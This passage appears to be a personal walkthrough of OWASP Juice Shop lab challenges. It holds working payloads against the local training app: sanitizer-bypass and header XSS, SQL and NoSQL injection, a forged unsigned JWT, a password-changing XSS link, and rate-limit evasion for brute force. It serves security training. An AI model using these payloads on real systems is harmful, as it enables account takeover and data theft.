    In the `package.json.bak` you might have noticed the pinned dependency `"sanitize-html": "1.4.2"`. Internet research will yield a reported [Cross-site Scripting (XSS)](https://snyk.io/vuln/npm:sanitize-html:20160801) vulnerability, which was fixed with version 1.4.3 - one release later than used by the Juice Shop. The referenced [GitHub issue](https://github.com/punkave/sanitize-html/issues/29) explains the problem and gives an exploit example:

    > Sanitization is not applied recursively, leading to a vulnerability to certain masking attacks. Example:I am not harmless: <<img src="csrf-attack"/>img src="csrf-attack"/> is sanitized to I am not harmless: <img src="csrf-attack"/>Mitigation: Run sanitization recursively until the input html matches the output html.

    1. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact).
    2. Enter `<<script>Foo</script>iframe src="javascript:alert(``xss``)">` as *Comment*
    3. Choose a rating and click *Submit*
    4. Visit [http://localhost:3000/#/about](http://localhost:3000/#/about) for a first "xss" alert (from the *Customer Feedback* slideshow)

    `<<script>Foo</script>iframe src="javascript:alert(`xss`)">`

    ## 21 -HTTP-Header XSS

    Perform a persisted XSS attack with `<iframe src="javascript:alert(`xss`)">` through an HTTP header.

    1. Login into application with valid credentials.
    2. once you logged in, now intercept the request in burpsuite and click on logout replace the header on on following request 

        [`http://localhost:3000/rest/saveLoginIp`](http://localhost:3000/rest/saveLoginIp)

    3. proprietary header `True-Client-IP`: 1.2.3.4
    4. the JSON response you will notice `lastLoginIp: "1.2.3.4"` and after logging in again you will see `1.2.3.4` as your *IP Address* on [http://localhost:3000/#/privacy-security/last-login-ip](http://localhost:3000/#/privacy-security/last-login-ip).
    5. Replay the request once more with `True-Client-IP: <iframe src="javascript:alert(`xss`)">` to solve this seriously obscure challenge.
    6. Log in again and visit [http://localhost:3000/#/privacy-security/last-login-ip](http://localhost:3000/#/privacy-security/last-login-ip) see the alert popup.

        [](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#257572146e37423f8bd50b7f036f8308)

    ## 22 - Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)

    /Injection

    1. Go to [http://localhost:3000/#/login](http://localhost:3000/#/login) and try logging in with *Email* `'` and any *Password* while observing the Browser DevTools network tab.
    2. You will notice the SQL query for the login in the error being thrown: `"sql": "SELECT * FROM Users WHERE email = ''' AND password = '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"`
    3. Solve [Exfiltrate the entire DB schema definition via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#exfiltrate-the-entire-db-schema-definition-via-sql-injection) to learn the exact column names of the `Users` table.
    4. Prepare a `UNION SELECT` payload what will a) ensure there is no result from the original query and b) will add the needed user on-the-fly using static values in the query.
    5. Log in with *Email* `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '1.2.3.4' as 'lastLoginIp' , 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`
    6. This will trick the application backend into handing out a valid JWT token and thus establishing a user session.

    —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

    # LEVEL -5

    —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

    ## 1- Blockchain Hype (Learn about the Token Sale before its official announcement.) ~ Security through Obscurity

    ///

    ## 2 -Change Bender's Password

    ### `(Change Bender's password into **slurmCl4ssic** without using SQL Injection or Forgot Password.)`

    (use postman tool)

    1. Log in as anyone.
    2. Probe the responses of `/rest/user/change-password` on various inputs:
        - [http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B](http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B)

            says `Current password is not correct.`

        - [http://localhost:3000/rest/user/change-password?new=B&repeat=B](http://localhost:3000/rest/user/change-password?new=B&repeat=B)

            yields a `200` success returning the updated user as JSON!

    3. Now [Log in with Bender's user account](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#log-in-with-benders-user-account) using SQL Injection.
    4. Craft a GET request with Bender's `Authorization Bearer` header to [http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic](http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic) to solve the challenge.

    [](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#71d288c6591f4eeca418ce22e1ab8058)

    ### **Bonus Round: Delivering the attack via reflected XSS**

    If you want to craft an actually realistic attack against `/rest/user/change-password` that you could send a user as a malicious link, you will have to invest a bit extra work, because a simple attack like *Search* for `<img src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">` will not work. Making someone click on the corresponding attack link [http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E) will return a `500` error when loading the image URL with a message clearly stating that your attack ran against a security-wall: `Error: Blocked illegal activity`

    To make this exploit work, some more sophisticated attack URL is required:

    [http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E](http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E)

    Pretty-printed this attack is easier to understand:

        <iframe src="javascript:xmlhttp = new XMLHttpRequest();
           xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic');
           xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
           xmlhttp.send();">
        </iframe>

    Anyone who is logged in to the Juice Shop while clicking on this link will get their password set to the same one we forced onto Bender!

    👏 Kudos to Joe Butler, who originally described this advanced XSS payload in his blog post [Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html).

    ## 3 -Leaked Access Logs

    ### Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.)

    1. Visit `[https://stackoverflow.com/questions/tagged/access-log](https://stackoverflow.com/questions/tagged/access-log)` to find all questions tagged with access-log in this popular platform
    2. .Visit [https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan](https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan) to find more unambiguous URL paths from the Juice Shop in it
    3. you will get [https://pastebin.com/4U1V1UjU](https://pastebin.com/4U1V1UjU)

    (search here for **password**)

     4. you get this as a current & new  password but while changing password it failed means the password is still current password

    `0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB`

    5. hash the known password with `MD5` and compare it to the password hashes harvested from [Retrieve a list of all user credentials via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection)
    Either way you will conclude that the password belongs to `J12934@juice-sh.op` so using this as Email and `0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB` as Password ``on [`http://localhost:3000/#/login`](http://localhost:3000/#/login) will solve the challenge

    6. but it will not work you need to do URL decode for password and here you get the original password **`0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB`**

## 4 - Email Leak

### (Perform an unwanted information disclosure by accessing data cross-domain.)

1. Find a request to the `/rest/user/whoami` API endpoint. Notice that you can remove the "Authorization" header and it still works.

    [](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#b3b37de856b54afc880d622279ec7890)

2. Add a URL parameter called "callback". This will cause the API to return the content as a JavaScript fragment (JSONP) rather than just a standard JSON object.

    [](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#2c7273cb9e01452da325c821f3e097e2)

    [`http://localhost:3000](http://localhost:3000/rest/user/whoami)/rest/user/whoami?callback=anyone`

    ## 5 -Extra Language

    ### Retrieve the language file that never made it into production.

    1. change the language and while doing so, check for network tab for the request
        - [http://localhost:3000/i18n/en.json](http://localhost:3000/i18n/en.json)
        - [http://localhost:3000/i18n/de_DE.json](http://localhost:3000/i18n/de_DE.json)
        - [http://localhost:3000/i18n/nl_NL.json](http://localhost:3000/i18n/nl_NL.json)
        - etc.
    2. (`aa_AA`, `ab_AA`, ..., `zz_ZY`, `zz_ZZ`) would still **not** solve the challenge, if we do brute-force then also get failed
    3. The hidden language is *Klingon* which is represented by a three-letter code `tlh` with the dummy country code `AA`.
    4. Request [http://localhost:3000/assets/i18n/tlh_AA.json](http://localhost:3000/assets/i18n/tlh_AA.json) to solve the challenge. majQa'!

    Instead of expanding your brute force pattern (which is not a very obvious decision to make) you can more easily find the solution to this challenge by investigating which languages are supported in the Juice Shop and how [the translations](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/translation.html) are managed. This will quickly bring you over to [https://crowdin.com/project/owasp-juice-shop](https://crowdin.com/project/owasp-juice-shop) which immediately spoilers *Klingon* as a supported language. Hovering over the corresponding flag will eventually spoiler the language code `tlh_AA`.

    ## 6 -Two Factor Authentication

    ### Solve the 2FA challenge for user "wurstbrot"

    (Disabling, bypassing or overwriting his 2FA settings does not count as a solution)

    to solve this challenge we are going to use SQL injection for getting 2FA code.

    1. we can get email address of wurstbrot by Solving Retrieve a list of all user credentials via SQL Injection challenge.
    2. we get to know the email address is `wurstbrot@juice-sh.op`
    3. now try to login with the email using SQL injection

        `wurstbrot@juice-sh.op' --`

        but now you can see a 2FA is implemented asking for token.

    `http://localhost:3000/rest/products/search?q=')) union select '1',id,email,password,**2fa**,null,null,null,null from users--`

    now simply replace any null with **2fa,2fatoken,2fakey,totp,totpkey,totpsecret**

    and finally we get a valid column name exist : **`totpsecret`**

    `http://localhost:3000/rest/products/search?q=')) union select '1',id,email,password,**totpsecret**,null,null,null,null from users--`

1. find the entry of user `wurstbrot@juice-sh.op` with `"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"` whereas all other users have `"image":""` set.
2. Using your favorite 2FA application (e.g. [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2)) create a new entry, but instead of scanning any QR code type in the key `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` manually.
3. Go to

    ### and use SQL Injection to log in with `wurstbrot@juice-sh.op'--` as *Username* and anything as *Password*.

4. You will be presented with the *Two Factor Authentication* input screen where you now have to type in the 6-digit code currently displayed on your 2FA app

## 7 - Unsigned JWT

### Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.

1. first got an option where you can see an Authorisation header responsible for making request to server.
2. here we intercept a request with normal user on this endpoint 

    [`http://localhost:3000/rest/user/data-export`](http://localhost:3000/rest/user/data-export)

    when we click on export simply we get an request intercept it,  and

    the authorization header, now go to jwt.io

3. Copy the JWT (i.e. everything after Bearer in the Authorization header) and decode it.
4. in encoded token replace eyJhbGciOiJ**S** with eyJhbGciOiJ**I** in starting of token, there is flaw in jwt.io

    [](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#b75e8ce7a6d34e29b2efaa5287e4944e)

 5. under payload property on right side, we need to change email with `jwtn3d@juice-sh.op`

 6. under header property replace the on right side, `"alg": "none"`

[](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#e0d0d7d772f64d7d8d84d51ded2ab241)

 7.  now simply use this site to [https://simplycalc.com/base64url-encode.php](https://simplycalc.com/base64url-encode.php) make a both attribute     

base64url encoded as 

[](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#fa35671d7a1f42c0ba1d02d0e238b28c)

[](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#830775e27f9c4b43a640ec454b88854f)

`base64url(header).base64url(payload).`

(.) dot is important on both ends.

and we get the following string as a token / Authorization Token

`ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxNiwKICAgICJ1c2VybmFtZSI6ICIiLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiODI3Y2NiMGVlYThhNzA2YzRjMzRhMTY4OTFmODRlN2IiLAogICAgInJvbGUiOiAiY3VzdG9tZXIiLAogICAgImxhc3RMb2dpbklwIjogIjE3Mi4xNy4wLjEiLAogICAgInByb2ZpbGVJbWFnZSI6ICJkZWZhdWx0LnN2ZyIsCiAgICAidG90cFNlY3JldCI6ICIiLAogICAgImlzQWN0aXZlIjogdHJ1ZSwKICAgICJjcmVhdGVkQXQiOiAiMjAxOS0xMC0yMCAwNzoyNjo0NC43MjIgKzAwOjAwIiwKICAgICJ1cGRhdGVkQXQiOiAiMjAxOS0xMC0yMCAwOTo0NTowMS45MDIgKzAwOjAwIiwKICAgICJkZWxldGVkQXQiOiBudWxsCiAgfSwKICAiaWF0IjogMTU3MTYzMDE5NSwKICAiZXhwIjogMTU3MTY0ODE5NQp9.`

8.  now use this as Authorization header to send request 

[](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#e9fb2dd320b5425fbe8466d9181d8e44)

[](https://www.notion.so/8c18db82b18d41ceba63d2ecbf9e308c#2701dc85ac7545d1a6c0cb15cdc0f9e6)

## 8 -Login CISO

### Exploit OAuth 2.0 to log in with the Chief Information Security Officer's user account.

1. Visit [http://localhost:3000/#/login](http://localhost:3000/#/login) and enter some known credentials.
2. Tick the *Remember me* checkbox and *Log in*.
3. Inspecting the application cookies shows a new `email` cookie storing the plaintext email address.
4. *Log out* and go back to [http://localhost:3000/#/login](http://localhost:3000/#/login). Make sure *Remember me* is still ticked.
5. Using `ciso@juice-sh.op` as *Email* and anything as *Password* perform a failed login attempt.
6. Inspecting the `email` cookie shows it was set to `ciso@juice-sh.op` even when login failed.
7. Inspecting any request being sent from now on you will notice a new custom HTTP header `X-User-Email: ciso@juice-sh.op`.
8. Now visit [http://localhost:3000/#/login](http://localhost:3000/#/login) again, but this time choose the *Log in with Google* button to log in with your own Google account.
9. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact) and check the *Author* field to be surprised that you are logged in as `ciso@juice-sh.op` instead with your Google email address, because [the OAuth integration for login will accept the 'X-User-Email' header as gospel regardless of the account that just logged in](https://incognitjoe.github.io/hacking-the-juice-shop.html).

If you do not own a Google account to log in with or are running the Juice Shop on a hostname that is not recognized, you can still solve this challenge by logging in regularly but add `"oauth": true` to the JSON payload `POST`ed to [http://localhost:3000/rest/user/login](http://localhost:3000/rest/user/login).

## 9 - NoSQL Exfiltration

### All your orders are belong to us! Even the ones which don't.

1. Open the network tab of your browser's DevTools.
2. Visit [http://localhost:3000/#/track-order](http://localhost:3000/#/track-order) and search for `x` to witness a `GET` request [http://localhost:3000/rest/track-order/x](http://localhost:3000/rest/track-order/x) being sent returning `{"status":"success","data":[{"orderId":"x"}]}`.
3. Search for `'` (single quote) as *Order ID* now. [http://localhost:3000/rest/track-order/'](http://localhost:3000/rest/track-order/') will throw an error

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/error_page-nosqli.png)

4. Searching for `''` (two single quotes) as *Order ID* now will let [http://localhost:3000/rest/track-order/''](http://localhost:3000/rest/track-order/'') throw an `Unexpected string` error instead of the previous `Invalid or unexpected token`.
5. While not stated anywhere in the error messages, it can be assumed with some MongoDB background that the query probably resembles something like `{ $where: "property === '" + payload + "'" }`.
6. The required `payload` for the challenge needs to make sure all data is matched while squeezing itself into the query in a non-breaking way.
7. Search for `' || true || '` resulting in [http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'](http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20') which will in fact query and return all orders from the MarsDB.

## 10 - Reset Bjoern's Password.

### Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.

1. Trying to find out who "Bjoern" might be should quickly lead you to the OWASP Juice Shop project leader and author of this ebook.
2. Visit [https://www.facebook.com/bjoern.kimminich](https://www.facebook.com/bjoern.kimminich) to immediately learn that he is from the town of *Uetersen* in Germany.
3. Visit [https://gist.github.com/9045923](https://gist.github.com/9045923) or [https://pastebin.com/JL5E0RfX](https://pastebin.com/JL5E0RfX) to find the source code of a (truly amazing) game Bjoern wrote in Turbo Pascal in 1995 (when he was a teenager) to learn his phone number area code of *04122* which belongs to Uetersen. This is sufficient proof that you in fact are on the right track.
4. [http://www.geopostcodes.com/Uetersen](http://www.geopostcodes.com/Uetersen) will tell you that Uetersen has ZIP code *25436*.
5. Visit [http://localhost:3000/#/forgot-password](http://localhost:3000/#/forgot-password) and provide `bjoern@juice-sh.op` as your *Email*.
6. In the subsequently appearing form, provide `25436` as *Your ZIP/postal code when you were a teenager?*
7. Type and *New Password* and matching *Repeat New Password* followed by hitting *Change* to **not solve** this challenge.
8. Bjoern added some obscurity to his security answer by using an uncommon variant of the pre-unification format of [postal codes in Germany](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#postal-codes-in-germany).
9. Visit [http://www.alte-postleitzahlen.de/uetersen](http://www.alte-postleitzahlen.de/uetersen) to learn that Uetersen's old ZIP code was `W-2082`. This would not work as an answer either. Bjoern used the written out variation: `West-2082`.
10. Change the answer to *Your ZIP/postal code when you were a teenager?* into `West-2082` and click *Change* again to finally solve this challenge.

### **Postal codes in Germany**

> Postal codes in Germany, Postleitzahl (plural Postleitzahlen, abbreviated to PLZ; literally "postal routing number"), since 1 July 1993 consist of five digits. The first two digits indicate the wider area, the last three digits the postal district.Before reunification, both the Federal Republic of Germany (FRG) and the German Democratic Republic (GDR) used four-digit codes. Under a transitional arrangement following reunification, between 1989 and 1993 postal codes in the west were prefixed with 'W', e.g.: W-1000 [Berlin] 30 (postal districts in western cities were separate from the postal code) and those in the east with 'O' (for Ost), e.g.: O-1xxx Berlin.4

## 11 - Reset Morty's Password

### Reset Morty's password via the Forgot Password mechanism with his obfuscated answer to his security question.

1. Trying to find out who "Morty" might be should *eventually* lead you to *Morty Smith* as the most likely user identity

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Morty_Smith.jpg)

2. Visit [http://rickandmorty.wikia.com/wiki/Morty](http://rickandmorty.wikia.com/wiki/Morty) and skim through the [Family](http://rickandmorty.wikia.com/wiki/Morty#Family) section
3. It tells you that Morty had a dog named *Snuffles* which also goes by the alias of *Snowball* for a while.
4. Visit [http://localhost:3000/#/forgot-password](http://localhost:3000/#/forgot-password) and provide `morty@juice-sh.op` as your *Email*
5. Create a word list of all mutations (including typical "leet-speak"-variations!) of the strings `snuffles` and `snowball` using only
    - lower case (`a-z`)
    - upper case (`A-Z`)
    - and digit characters (`0-9`)
6. Write a script that iterates over the word list and sends well-formed requests to `http://localhost:3000/rest/user/reset-password`. A rate limiting mechanism will prevent you from sending more than 100 requests within 5 minutes, severely hampering your brute force attack.
7. Change your script so that it provides a different `X-Forwarded-For`-header in each request, as this takes precedence over the client IP in determining the origin of a request.
8. Rerun your script you will notice at some point that the answer to the security question is `5N0wb41L` and the challenge is marked as solved.
9. Feel free to cancel the script execution at this point.

📕: If you do not want to write your own script for this challenge, take a look at [juice-shop-mortys-question-brute-force.py](https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820) which was kindly published as a Gist on GitHub by [philly-vanilly](https://github.com/philly-vanilly).

> Leet (or "1337"), also known as eleet or leetspeak, is a system of modified spellings and verbiage used primarily on the Internet for many phonetic languages. It uses some alphabetic characters to replace others in ways thdev at play on the similarity of their glyphs via reflection or other resemblance. Additionally, it modifies certain words based on a system of suffixes and alternative meanings.The term "leet" is derived from the word elite. The leet lexicon involves a specialized form of symbolic writing. For example, leet spellings of the word leet include 1337 and l33t; eleet may be spelled 31337 or 3l33t. Leet may also be considered a substitution cipher, although many dialects or linguistic varieties exist in different online communities.5

## 12 - Retrieve Blueprint

### Deprive the shop of earnings by downloading the blueprint for one of its products.

1. The description of the *OWASP Juice Shop Logo (3D-printed)* product indicates that this product might actually have kind of a blueprint
2. Download the product image  from [http://localhost:3000/assets/public/images/products/3d_keychain.jpg](http://localhost:3000/assets/public/images/products/3d_keychain.jpg) and view its [Exif metadata](https://en.wikipedia.org/wiki/Exif)
3. here we can use exiftool to extract data from image.
4. Download [http://localhost:3000/assets/public/images/products](http://localhost:3000/assets/public/images/products/3d_keychain.jpg)[/JuiceShop.stl](http://localhost:3000/public/images/products/JuiceShop.stl) to solve this challenge

## 13 - Supply Chain Attack

### Inform the development team about a danger to some of their credentials. (Send them the URL of the original report or the CVE of this vulnerability)

1. Solve [Access a developer's forgotten backup file](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#access-a-developers-forgotten-backup-file)
2. The `package.json.bak` contains not only runtime dependencies but also development dependencies under the `devDependencies` section.
3. Go through the list of `devDependencies` and perform research on vulnerabilities in them which would allow a Software Supply Chain Attack.
4. For the `eslint-scope` module you will learn about one such incident exactly in the pinned version `3.7.2`, e.g. [https://status.npmjs.org/incidents/dn7c1fgrr7ng](https://status.npmjs.org/incidents/dn7c1fgrr7ng) or [https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes)
5. Both above links refer to the original report of this vulnerability on GitHub: [https://github.com/eslint/eslint-scope/issues/39](https://github.com/eslint/eslint-scope/issues/39)
6. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact)
7. Submit your feedback with `https://github.com/eslint/eslint-scope/issues/39` in the comment to solve this challenge

## 14 - Frontend Typosquatting

### Inform the shop about a typosquatting imposter that dug itself deep into the frontend. (Mention the exact name of the culprit)

1. Request [http://localhost:3000/3rdpartylicenses.txt](http://localhost:3000/3rdpartylicenses.txt) to retrieve the 3rd party license list generated by Angular CLI by default
2. Combing through the list of modules you will come across `ng2-bar-rating` which openly reveals its intent on [https://www.npmjs.com/package/ng2-bar-rating](https://www.npmjs.com/package/ng2-bar-rating)

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ng2-bar-rating.png)

3. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact)
4. Submit your feedback with `ng2-bar-rating` in the comment to solve this challenge

You can probably imagine that the typosquatted `ng2-bar-rating` would be *a lot harder* to distinguish from the original repository `ngx-bar-rating`, if it where not marked with the *THIS IS **NOT** THE MODULE YOU ARE LOOKING FOR!*-warning at the very top. Below you can see the original `ngx-bar-rating` module page on NPM:

![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ngx-bar-rating.png)

—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

# LEVEL -6

—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

## 1 - Arbitrary File Write

### Overwrite the Legal Information file.
